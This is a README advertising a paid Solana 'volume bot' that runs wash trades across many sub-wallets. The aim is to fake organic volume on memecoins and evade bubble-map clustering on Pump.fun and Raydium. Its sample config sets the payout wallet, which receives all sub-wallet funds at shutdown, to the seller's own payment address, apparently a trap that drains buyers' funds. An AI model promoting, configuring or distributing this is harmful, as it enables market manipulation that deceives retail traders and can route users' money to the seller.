# Solana Multi-Wallet Volume & Market Maker Bot (Pump.fun & Raydium AMM)

An autonomous, production-ready Solana algorithmic trading engine engineered to generate natural, organic trading volume, maintain active maker depth, and boost memecoin discoverability across **DexScreener**, **Birdeye**, and **Pump.fun**.

---

## ⚡ Core Architecture & Features

* **Multi-Wallet Concurrency:** Distributes micro-trades across up to 20 isolated sub-wallets. Eliminates clustered transaction graphs on bubble maps.
* **Dual DEX Engine:**
  - **Pump.fun Bonding Curve:** Direct interaction with `6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P`.
  - **Raydium AMM V4:** Direct pool swap via `675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8`.
* **Organic Trading Simulation:** Configurable buy/sell bias (default 65/35), randomized trade sizes, and randomized jitter delays to replicate authentic retail volume.
* **Jito MEV Tip Bundles:** Bypasses public Solana mempools by routing trades directly to Jito Block Engine validators, ensuring 0-slippage frontrun protection.
* **Automated Capital Sweep:** Built-in safety function sweeps all residual sub-wallet balances back to the master settlement address in a single command.

---

## 🚀 Quick Start Guide

### 1. Requirements
* Python 3.10+
* Standard Python libraries (`asyncio`, `urllib`, `hashlib`, `json`)

### 2. Configuration
Edit `config.json` with your target token mint and parameters:

```json
{
  "rpc_url": "https://api.mainnet-beta.solana.com",
  "target_dex": "pump_fun",
  "target_token_mint": "YOUR_TOKEN_MINT_HERE",
  "sub_wallet_count": 5,
  "min_trade_sol": 0.005,
  "max_trade_sol": 0.025,
  "min_delay_sec": 3.0,
  "max_delay_sec": 10.0,
  "enable_jito": true,
  "jito_tip_sol": 0.0005,
  "master_payout_wallet": "3Uiis6Zv8fsxuvANCAvDPU5dGxrnjrGgg4HpN1Pz6HHn"
}
```

### 3. Execution
```bash
python volume_bot.py
```

Press `Ctrl+C` at any time to gracefully halt trading and sweep all funds back to the master wallet.

---

## 💎 Commercial License & Full Source Package

* **Standard License:** **$25 USD**
* **Instant Settlement Wallets:**
  - **SOL:** `3Uiis6Zv8fsxuvANCAvDPU5dGxrnjrGgg4HpN1Pz6HHn`
  - **ETH (Base / Mainnet):** `0xeC7056A6440F36b8616b4bF2B41501AaAd005c9D`
  - **BTC:** `bc1qm0kwx7ed4g5wzl3rzuu4wdh9lqf00knhs5r778`

For automated license key generation or custom multi-node setups, send transaction hash to `kamu.dev@outlook.com`.
